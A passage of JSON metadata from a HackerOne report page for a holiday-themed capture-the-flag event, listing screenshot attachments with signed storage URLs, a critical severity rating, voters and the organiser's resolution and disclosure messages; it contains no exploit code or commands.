BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5b2bba818ce3c058eedd8f56c8e73afeabcc73381c1d20ff543da2145257e4cb","file_size":316728,"type":"image/png"},{"id":1131254,"file_name":"Flag-11.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kv89s0283wrjssk2auh24rn8z05c?response-content-disposition=attachment%3B%20filename%3D%22Flag-11.png%22%3B%20filename%2A%3DUTF-8%27%27Flag-11.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4783ba1fd45a3489123a56bca02f4e2a90d4a203bfb23442a3e3a3d28a1d266a","file_size":331789,"type":"image/png"},{"id":1131255,"file_name":"Flag-12.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6xljl4zl9xvzoe7hyg4bbuknph8c?response-content-disposition=attachment%3B%20filename%3D%22Flag-12.png%22%3B%20filename%2A%3DUTF-8%27%27Flag-12.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=57cf4469b928fda3e223e2e7ee20370b8e65109b89eaec68e45ca7797c68e014","file_size":812695,"type":"image/png"},{"id":1131256,"file_name":"Invalid-uuid.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ep03une2gqrcrqzkyn5ej6mscsfn?response-content-disposition=attachment%3B%20filename%3D%22Invalid-uuid.png%22%3B%20filename%2A%3DUTF-8%27%27Invalid-uuid.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a202479304af54c937819206b198f324a5652215d788fe42b5f858c4fa0309e5","file_size":142011,"type":"image/png"},{"id":1131257,"file_name":"local-attack-failed.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sx6pwhs4pzbmq8gwdug987nr06b9?response-content-disposition=attachment%3B%20filename%3D%22local-attack-failed.png%22%3B%20filename%2A%3DUTF-8%27%27local-attack-failed.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ce81497e01cd23db093862bebbc19d47881ff762689fd8cd9efa9d0af2b0ddd1","file_size":58359,"type":"image/png"},{"id":1131258,"file_name":"leaking-user-sessions.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xnz3ov1wwgc43bpxrr3ekldtfnza?response-content-disposition=attachment%3B%20filename%3D%22leaking-user-sessions.png%22%3B%20filename%2A%3DUTF-8%27%27leaking-user-sessions.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d5fceff8900f3b0f0f42abc6f6205e9b3806ada6ca1217a8d2a86cb1d8068959","file_size":359481,"type":"image/png"},{"id":1131259,"file_name":"str_replace_bypass.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dh1wcvmvr404j6upabl9nt1s5ljq?response-content-disposition=attachment%3B%20filename%3D%22str_replace_bypass.png%22%3B%20filename%2A%3DUTF-8%27%27str_replace_bypass.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=37b80549ca21f84f92df03e2344d2da5020c5a5b702d558da06d845f03b9de2d","file_size":73887,"type":"image/png"},{"id":1131260,"file_name":"Logged-in.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jnj9e09arke4u3pu1ms3963me5io?response-content-disposition=attachment%3B%20filename%3D%22Logged-in.png%22%3B%20filename%2A%3DUTF-8%27%27Logged-in.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=27ddc3ea683cb0c2eb8402b2d302b9a7a92eb628acb6393dfe5c47a2137f02e0","file_size":405534,"type":"image/png"},{"id":1131261,"file_name":"templats-dir.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ct8snb7w746oqnfo9eieke4n9biu?response-content-disposition=attachment%3B%20filename%3D%22templats-dir.png%22%3B%20filename%2A%3DUTF-8%27%27templats-dir.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=29d123f7ea5d5d2053e299c51605d9894626adfa4c743377d80b94d35f83e7bf","file_size":62314,"type":"image/png"},{"id":1131262,"file_name":"zip-crack.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1sjx51c1bjhuzw8ud1xiam2442ex?response-content-disposition=attachment%3B%20filename%3D%22zip-crack.png%22%3B%20filename%2A%3DUTF-8%27%27zip-crack.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f64f96501be40cb3283dc836d6bf603df915d928296ea4e4dd5461f19631cfc2","file_size":254339,"type":"image/png"}],"allow_singular_disclosure_at":"2021-02-06T21:37:49.410Z","allow_singular_disclosure_after":-21311019.47583727,"singular_disclosure_allowed":true,"vote_count":5,"voters":["sudi","mattberg","hein_thant","2xa31k","not_khun_myat"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":59882,"asset_type":"URL","asset_identifier":"hackyholidays.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10299580,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for participating in the 12 Days of Hacky Holidays and helping us stop the grinch! ","automated_response":false,"created_at":"2021-01-07T21:31:29.593Z","updated_at":"2021-01-07T21:31:29.593Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"hein_thant","url":"/hein_thant"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10299663,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for response.\n\nI guess we are gonna disclose the report, don't we? \n\n@hein_thant ","automated_response":false,"created_at":"2021-01-07T21:37:49.373Z","updated_at":"2021-01-07T21:37:49.373Z","first_to_agree":true,"actor":{"username":"hein_thant","cleared":false,"url":"/hein_thant","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/X55GnoH6WxBMwuWSC56rEpDt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10333587,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-11T21:32:20.420Z","updated_at":"2021-01-11T21:32:20.420Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10333588,"is_internal":false,"editable":false,"type":"Act